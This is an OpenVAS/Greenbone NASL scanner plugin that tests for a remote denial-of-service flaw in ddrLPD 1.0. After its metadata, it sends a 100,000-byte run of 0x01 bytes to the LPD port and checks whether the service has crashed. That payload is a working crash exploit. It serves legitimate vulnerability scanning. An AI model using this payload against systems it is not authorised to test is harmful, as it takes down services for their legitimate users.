# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100626");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-05-05 18:44:23 +0200 (Wed, 05 May 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("ddrLPD 1.0 Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl", "find_service1.nasl", "find_service2.nasl");
  script_require_ports("Services/lpd", 515);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39904");

  script_tag(name:"summary", value:"ddrLPD is prone to a remote denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted LPD request and checks if the service is still
  responding.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to crash the affected
  application, denying service to legitimate users.");

  script_tag(name:"affected", value:"ddrLPD 1.0 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

function check_lp_status(soc) {

  req = raw_string(0x01) + string("default") + raw_string(0x0A);
  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1);

  if(strlen(buf) && strlen(buf) == 1 && ord(buf[0]) == 255)
    return TRUE;
  else
    return FALSE;
}

port = service_get_port(default:515, proto:"lpd");

if(!soc = open_sock_tcp(port))
  exit(0);

if(!check_lp_status(soc:soc)) {
  close(soc);
  exit(0);
}

req = crap(data:raw_string(0x01), length:100000);
send(socket:soc, data:req);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1 || ! check_lp_status(soc:soc1)) {
  security_message(port:port);
  exit(0);
} else {
  close(soc1);
}

exit(0);
